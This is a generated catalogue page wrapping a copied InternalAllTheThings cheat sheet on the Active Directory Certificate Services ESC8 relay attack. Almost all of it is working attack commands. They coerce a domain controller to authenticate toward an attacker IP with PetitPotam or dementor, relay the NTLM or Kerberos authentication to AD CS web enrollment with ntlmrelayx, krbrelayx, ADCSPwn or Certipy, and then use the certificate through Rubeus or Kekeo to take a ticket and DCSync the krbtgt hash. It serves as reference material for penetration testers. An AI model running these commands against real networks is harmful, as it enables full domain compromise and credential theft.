---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Active Directory - Certificate ESC8

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-ad-adcs-esc08` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adcs-esc08.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Active Directory - Certificate ESC8](../../topics/active-directory/active-directory-certificate-esc8.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-ad-adcs-esc08 |
| name | Active Directory - Certificate ESC8 |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/ad-adcs-esc08.md |

## Preserved Source Material

````yaml
_body: "# Active Directory - Certificate ESC8\n\n## ESC8 - Web Enrollment Relay\n\n> An attacker can trigger a Domain Controller\
  \ using PetitPotam to NTLM relay credentials to a host of choice. The Domain Controller’s NTLM Credentials can then be relayed\
  \ to the Active Directory Certificate Services (AD CS) Web Enrollment pages, and a DC certificate can be enrolled. This\
  \ certificate can then be used to request a TGT (Ticket Granting Ticket) and compromise the entire domain through Pass-The-Ticket.\n\
  \nRequire [SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket/pull/1101) PR #1101\n\n* **Version 1**: NTLM\
  \ Relay + Rubeus + PetitPotam\n\n  ```powershell\n  impacket> python3 ntlmrelayx.py -t http://<ca-server>/certsrv/certfnsh.asp\
  \ -smb2support --adcs\n  impacket> python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support\
  \ --adcs --template VulnTemplate\n  # For a member server or workstation, the template would be \"Computer\".\n  # Other\
  \ templates: workstation, DomainController, Machine, KerberosAuthentication\n\n  # Coerce the authentication via MS-ESFRPC\
  \ EfsRpcOpenFileRaw function with petitpotam \n  # You can also use any other way to coerce the authentication like PrintSpooler\
  \ via MS-RPRN\n  git clone https://github.com/topotam/PetitPotam\n  python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD\
  \ $ATTACKER_IP $TARGET_IP\n  python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP\n  python3 dementor.py <listener>\
  \ <target> -u <username> -p <password> -d <domain>\n  python3 dementor.py 10.10.10.250 10.10.10.10 -u user1 -p Password1\
  \ -d lab.local\n\n  # Use the certificate with rubeus to request a TGT\n  Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate>\
  \ /ptt\n  Rubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzC...mUUXS /ptt\n\n  # Now you can use the TGT to perform a\
  \ DCSync\n  mimikatz> lsadump::dcsync /user:krbtgt\n  ```\n\n* **Version 2**: NTLM Relay + Mimikatz + Kekeo\n\n  ```powershell\n\
  \  impacket> python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template\
  \ DomainController\n\n  # Mimikatz\n  mimikatz> misc::efs /server:dc.lab.local /connect:<IP> /noauth\n\n  # Kekeo\n  kekeo>\
  \ base64 /input:on\n  kekeo> tgt::ask /pfx:<BASE64-CERT-FROM-NTLMRELAY> /user:dc$ /domain:lab.local /ptt\n\n  # Mimikatz\n\
  \  mimikatz> lsadump::dcsync /user:krbtgt\n  ```\n\n* **Version 3**: Kerberos Relay\n\n  ```ps1\n  # Setup the relay\n \
  \ sudo krbrelayx.py --target http://CA/certsrv -ip attacker_IP --victim target.domain.local --adcs --template Machine\n\n\
  \  # Run mitm6\n  sudo mitm6 --domain domain.local --host-allowlist target.domain.local --relay CA.domain.local -v\n  ```\n\
  \n* **Version 4**: ADCSPwn - Require `WebClient` service running on the domain controller. By default this service is not\
  \ installed.\n\n  ```powershell\n  https://github.com/bats3c/ADCSPwn\n  adcspwn.exe --adcs <cs server> --port [local port]\
  \ --remote [computer]\n  adcspwn.exe --adcs cs.pwnlab.local\n  adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local\
  \ --port 9001\n  adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --output C:\\Temp\\cert_b64.txt\n  adcspwn.exe\
  \ --adcs cs.pwnlab.local --remote dc.pwnlab.local --username pwnlab.local\\mranderson --password The0nly0ne! --dc dc.pwnlab.local\n\
  \n  # ADCSPwn arguments\n  adcs            -       This is the address of the AD CS server which authentication will be\
  \ relayed to.\n  secure          -       Use HTTPS with the certificate service.\n  port            -       The port ADCSPwn\
  \ will listen on.\n  remote          -       Remote machine to trigger authentication from.\n  username        -       Username\
  \ for non-domain context.\n  password        -       Password for non-domain context.\n  dc              -       Domain\
  \ controller to query for Certificate Templates (LDAP).\n  unc             -       Set custom UNC callback path for EfsRpcOpenFileRaw\
  \ (Petitpotam) .\n  output          -       Output path to store base64 generated crt.\n  ```\n\n* **Version 5**: Certipy\
  \ ESC8\n\n  ```ps1\n  certipy relay -ca 172.16.19.100\n  ```\n\n* **Version 6**: Kerberos Relay (self relay in case of only\
  \ one DC)\n\n  ```ps1\n  # Add dns entry with the james forshaw's trick\n  dnstool.py -u \"domain.local\\user\" -p \"password\"\
  \ -r \"computer1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA\" -d \"10.10.10.10\" --action add \"10.10.10.11\" --tcp\n\n\
  \  # Coerce kerberos with petit potam on dns entry\n  petitpotam.py -u 'user' -p 'password' -d domain.local 'computer1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA'\
  \ computer.domain.local\n\n  # relay kerberos\n  python3 krbrelayx.py -t 'http://computer.domain.local/certsrv/certfnsh.asp'\
  \ --adcs --template DomainController -v 'COMPUTER$' -ip 10.10.10.10\n  ```\n\n## References\n\n* [NTLM relaying to AD CS\
  \ - On certificates, printers and a little hippo - Dirk-jan Mollema](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)\n\
  * [AD CS relay attack - practical guide - @exandroiddev - June 23, 2021](https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/)"
_relative_path: active-directory/ad-adcs-esc08.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adcs-esc08.md
````
